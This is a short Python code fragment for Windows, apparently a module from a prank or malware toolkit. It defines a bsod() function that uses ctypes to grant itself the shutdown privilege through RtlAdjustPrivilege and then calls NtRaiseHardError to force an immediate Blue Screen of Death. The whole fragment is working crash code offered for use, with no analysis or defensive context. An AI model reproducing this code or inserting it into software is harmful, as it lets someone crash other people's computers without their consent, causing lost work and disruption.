
# Import modules
from ctypes import byref, c_bool, windll
from ctypes.wintypes import DWORD

__t1 = c_bool()
__t2 = DWORD()

""" Make blue screen of death """
def bsod():
    windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(__t1))
    windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(__t2))